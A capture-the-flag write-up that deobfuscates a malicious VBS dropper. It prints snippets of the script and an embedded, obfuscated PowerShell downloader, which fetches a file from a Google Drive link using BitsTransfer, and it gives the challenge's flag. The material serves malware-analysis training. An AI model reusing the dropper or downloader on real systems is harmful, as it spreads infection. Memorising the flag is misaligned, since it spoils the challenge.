# VBS Vendetta | Medium (300 Points)

Hi Analyst,

We received an alert for an unusual file that was executed on a user's host which resulted in some strange behaviour. Unfortunately, it is heavily obfuscated so we need your help to see what the final payload is.

Attached is a 7-zip archive containing the malicious VBS script which we acquired from the user's host during our investigation - `56418-MaliciousVBS.7z`. Contained in the 7-zip is the VBS script which we were alerted to, namely `freeRAM.vbs`.

Good Luck

password: `infected`

-----

Once you open `freeRAM.vbs`, you'll notice there are over 4000 lines, most of which begin with  `Rem` (VBS comment) or `Private Const` (variable assignments). These lines are never used by the program, so can be removed via regex:

```
^REM .*
^Private Const .*
^\n\n
```

What remains is a number of calls to `Assimilationist139()` which accepts a single string as an argument, appending this string to a temp file named `Skibsskruerne91.txt`.

```
Set Tolkedes = CreateObject("Scripting.FileSystemObject")

Unquote=Tolkedes.GetSpecialFolder(2) & "\Skibsskruerne91.txt"
...
Sub Assimilationist139(ByVal Skodning)
	Dim Sedeses
	
	Set Sedeses = Tolkedes.OpenTextFile(Unquote, 8, True)

	Sedeses.Write Skodning

	Sedeses.Close
```

We can clean this up for readability.

```
Set FileSystemObjectVar = CreateObject("Scripting.FileSystemObject")

tempFilePath=FileSystemObjectVar.GetSpecialFolder(2) & "\Skibsskruerne91.txt"
...
Sub WriteToLog(ByVal content)
    Dim tempFile
    Set tempFile = FileSystemObjectVar.OpenTextFile(tempFilePath, 8, True)

    tempFile.Write content
    tempFile.Close
End Sub
```

This will create a file within `%TEMP%` from the [GetSpecialFolder function]() with an encoded PowerShell command:

![](/images/vbs_powershell.png)

Cleaning this up in a text editor, we can see three new functions, one of which is most relevant - `albertuss()` which takes a single string as an argument:

```powershell
Function albertuss ([String]$Armariolum215) {
	$Pebermynters=[char][int]$Pebermynters;
	$Stikpiller=$Pebermynters+'ubstring';  # becomes substring
	$Mistletoes=8;
	$Afhudes=Ridefogders($Armariolum215);

	For ($Coapprover=7; $Coapprover -lt $Afhudes; $Coapprover += $Mistletoes) {
		$Dendropogon=$Armariolum215.$Stikpiller.Invoke($Coapprover, 1);
		$Konsistorialkontor=$Konsistorialkontor+$Dendropogon;
	}$Konsistorialkontor;
}
```

Cleaning this up:

```powershell
Function ExtractEveryEighthChar ([String]$inputString) {
    $stepSize = 8
    $stringLength = $inputString.Length
    $resultString = ""

    For ($index = 7; $index -lt $stringLength; $index += $stepSize) {
        $currentChar = $inputString.Substring.Invoke($index, 1)
        $resultString += $currentChar
    }

    return $resultString
}
```

We can write a Python script to extract every letter of each of the strings used in the function calls:

```python
encoded_strings = [" RegistTEkspertrContradaHypothenSabelkas ,insenf BoppeneIncongrrBaadskar,enzinti randlonPr,gresg Ag rsk ", "JennifehPredicttExtremitUnm.ddlpMalkendsAurined:Addi,en/attaina/ Zonet dMetamorrIncir,ui OvereavNeuro.aeg.nandr. Indregg GangshoMu keorohemielygChimangl OrbitseUdebliv.PitchpocInterbloElsewismSyvstje/Carates# Pulver#Afklaps?svendepe Byplanx FormprpAkasastoAnaerobr Ver,entBloddon=Stephan#Bazonbu-Bughind# Hindig# Exocyc#Thermo # Dueu t[ Cormac]Indkald].ectumciAtelierd Narrat=Kveller1Tr nchctAttribunOvervioXd gpengrConvexiXBekranscCowli,ehEndu eovGleaminMBesmokeoPomaryuxGingerlF.ikkestTP,colete skatebWScuddl 7OutdariSLyophillSt.vens3 samariF Ma,vasRArmadae0Skippen#Ud.ikli#ri.stri# No,tra#Vestas.#Repaire#  agocy# Wrangl#Fidusku# C.rame#Hollywo ", "QuintusiSauerkrekvoterexfys,ote ", "Indko,t$,nderbegSkrofu l FactuaoBastonabPlanetgaUnmeedyl Sieurs:FoleykuPExtenderBrayekoeSubnatua KontincZethstehExclaimeCurnst sMander  Sk,somm=Film nd UnsizedS BoghantNigeriaaThermosrPhutplat Forpl.-HathawaBTheodidiEndossetDybl rnsFacitteT minsterM sonsbaFle.gudn MalerlsMultisefNothinge ForstrrKon.ito Underdi-GarageaSSubstano D.urwau An epar Rohanlc ball.teCockney Sideord$A.choreMOpvarmey I,termnhelicota Simu.asNastali2Tr ndse4Renegot8ltgbeck Barrela-KommentD Tekstbe Indb.ss Ventelt VialfuiUngskuen Enter,aSmugkrotKvk eneiImpedimoInf,acenFendill  Unci l$Crunc iS Aoua sc ckeeinhRavespoiCorditizHabitaboGerrigtmSuperdeeGenopnardittiesiGadroona Papste ", "Droumy,$JernfilgIm.odyil  offosoLatrantbSkrmstyaD iverel Megaby:StudebaS telepac,egentshSpelliniTronfraztilfileo.isacchmMat.ikeeDhikrsgrFistelsiForfatta Finans=Escadri$LithopheAcidaspnCoregnavUnassai:CyklonbahovedskpFa,keltp TricoldForsy,iaL.vordet remun.aCoun er ", "WienerpIPachy.emZ osporpCytoanaoPseudoprPregaintDr.kneu-SaucepaMOrlogs.oPplretedUndivulu atomf,lAttentie Sauced Cul,asuBPreexchiR mfiretKej,haasMargentTSvrindurCellarea,loakstnWrinklesSt.tikefOrdrerse oct.merAcetona ", "Impa si$popp.ydgForbog,lA,rsagso strobobLoud rbaSneplovlTju.hne: PreconFholarctr DaahinoD.spitusTab lattCombinef Fangstr KaabesiAcajou e DermossSkaberg=propful(Do.beltTInputsteUn.hospsvernonitRuedesc- OliehoPRynkes,aHo,semotEnt,robhRegiste Pharmac$MegaaraSStjernecOver,tthGo,otheiAfskallzKalendeo isorlimPlannedeAfrignirIndkrediFerdiadaBilleds)gormssk ", "Dis ikoIKabsminfFerashs Mon cid(Stormpr$Jg.rsprPFran,kgrIns.lare JiffphaMy.midoc Rit,alh SlangeeSmykkeasFlui.um.Pikt,grJGodkendoTilemakbConferrSHjforrdtA.tokraa RelatitIrasja e Bestse Bunomas-Puk,erheSailyfaqR micat  Forske$HalvhedI Ba,kgaaGazernetMishandrAbstineoavisartcGaaretnhHerpesteHeterosmIndbe eiHjlan scKursor.aSaddelml Mammit)Faklen  Fortykk{CanafisSInterkitSu erhea Sspejdr Mone.atVetkous-SvedsbySDiagonalBeskydeePointere BambuspMoyit s I.comme1 shiesp}Fjor,reeTjenestlOomancysSoldateeDybdahl{ Tro,heS KondictForkobraBekosterSocialatSanguif- ConchoSEnkeltvlFlygtnieSyno,yme Se.skapKa,abas Delumin1Pigenav;Dobbe rR Diquate ReprodfAndaluslSpati teVideregc Toxifet Udsta.o ,outgjrAnnihili Ant,pazGrundtaidjvlehon iolsflg.hamabl Balloan$ QuelchG Besu.loMetricaoNon,arrsS.aansoeFlimsyssFotoalbkBrillefiMomsersnUnfoxy.}ulovmed ", "Brnds.l$Hugger,g O ertilOch,mysoRetreatbSkrivesaFor,ikllAfvikli:Unvnel.FParrotsr PedelloB weryls RodenstAffarvef Aley.rr skilniimanac seMismatcsMakvrke=overado(SvartbaTminimereGr.tuitsunddragtpre ect-PortepePRemplacaImprgnetAlbedogh Pe.hyd Hitherw$SpingelSRingstec KolerihObskurfi DressrzSaccomyoUninhibmVarmefreDiphyllrUover,oi Lint.laKapacit)Hjlpepr ", "Her.eli$ Skon egsubstanlSanatoroHaandhvbCorrivaaTwitchel orrupt:BestialaRibbonenAflnni,tpen estiHypoders F,rtrycInfrasphXylof,noSwollenl L,anabaHalimous  rappitTho,ougi Rewardc Rumm naForcibllRet inilHyperthyyagouru Afblegn=Spizzer ForvarmGAtomulyeReprimat Ugelan-AvertdeC NemospoForm ivnAuthorit nlbenpeskilrednBesvrlitSouveni Ron edo$HalvgudSGuldrancTjurhnehMelis aiFriz,grz TilhngoInterprmBeyli.aeE.stemprDeglam.iBgededea,jrnsol ", "Headsai$ ForesogSynkronlNyttevioUforgngbOceanolaExquisilDrmmesy: Int,rmBUnivocae mennesfAr illeoCy niderRa,iospdUnreturrEuropewiUdenlann BendtlgKarolinsPrsen,am EarpiciLousedtdUnikkesl AfklapeIsoclinrSavedes2D.missi0affress1Armeni, .anebor=Coconu.  ,ildoe[ StybbaSCh onicyComproms DinarztP,anetaeFlagermm Resinr. BornhoCKvivaleoMetastanEgelkkevBambu reRaisedarStampemtPutativ]Utu.ten:Gennemb:ElectroF Age.dar Ol enbo Subpiam Sop.edB angensaTactualsKondoleeBlndvrk6 udesth4OligospS BredbatMislighrSwordm,iAdolphcnflorifig svajry(Evoluti$Del.algaIndtrkknFormrketPropolsiRoughlesHol quicPreferehFr.sepuo,nytninl H rregaSolcellsMy tiqutKonneksiTricarbcrkeen.eaBitte.ll,lagterlMarblieyFladetp) Volumi ", " esecti$Sin.erlgUncocksl ,atrilo Meg spbSuperdua Stern.lAl onym: Wit.edB Nomadel Vol.nttGeosciee Ti sspsFruticut ZygobreKildetedSpirit.eNeologirHeterolsLakerer Tyrerin=Opspori Trafika[InkonseSTrolde yS rannesArchductUnpervee DiphthmHarmoni. Fjer,kTPigmentevisernexUndershtPistill. Er.ticEKaolinsnRe.eldic PartreoAspirandOveranaiTros.amnKoda.isgBerigei]Maddike:Skyndte:PrettyiAKnbjninSMicromeCTnderenI BogsidIUnfooli..ennemsGRedninge OvervitRaafrugSAthrocytCon inurBathyali gazolynFetichigTapestr(.utobio$ ValutaBApathieeZoologifIncaveroLaputapr discladKattefjrVi orisiDraconin.isarmegKaoli,is Urege.m P.rensi Foruredsprng,rl Fusarie UnsocirSte mti2Indhyll0hemmeli1Pollina)Polyr.y ", " Naturs$UnpagangPro andl Gener onedga,gb SprngsaProbosclEnkelta: EmanerMSovietioOutshamd HammedvKolkhosiCuratiznPragmatdTamponeePurinsbnDrivmid=transvo$RejfernBCand,lllPampin t Neutrae GenoptsAdiaphotThroatle ummertdSalleeteHemocoer Rebaptstimingf.BimahvasNotifi,u Empa sbBo ardosFissipetReferrerpree.apiResi.uan,entefrgDommerk(Kderege3Taragec5Legemli0 Udmeld4Spoke,w3Magneti9Rengjo , Cynanc3Afskrab1 Unperc7gymnasi5 Ukorre0Praefik)Bronkos ", "23QGbBe$FPvmzZ$MGZ5CWIpofWPK1GGocLzjTHpn3KND]wDlifjYXjVibBVQVKJg(VjT]/5hrcSDeNBt8voH0sCgskwyi5PaiA/D@DPzqsyb(NGe6UylO$O=xEqYv]]'KYW6wpGf27IPbNdlrBaWS(/aQvPl$)Lg]g@5djg{zqTpxKz1(J(xW@efNvULsFD8k33GDu7eOC$LbOX9]voljsXa)hyLd2w5@Uvf3xQcF$d6lkb3vimIkF bC7j] QE7EL09jvmdcVGgYaZ2ccNuDjGfPB/sXGI4MofJb9FeBRfdmMO6qMismF5aFctDLB]1XW3jIyLb2wsdzqn35G0Ur/$c0RZcNel57D)SP8ZdHC6YBrS7DbXK@ppeUI8e7 H9rlprjlEflNJQqk82@jM5QZnayNa/MCC4wzguZia}yN79D)2"]

def extract_every_eighth_char(input_string):
    """
    Extracts every 8th character from the input string, starting from index 7.
    """
    return ''.join(input_string[i] for i in range(7, len(input_string), 8))

for s in encoded_strings:
        result = extract_every_eighth_char(s)
        print(result)  # Output will be every 8th character starting from index 7
```

![](/images/vbs_flag.png)

```
flag{1f8e9a5c3b7d2f4e6a1b3c5d7e9f2a4}
```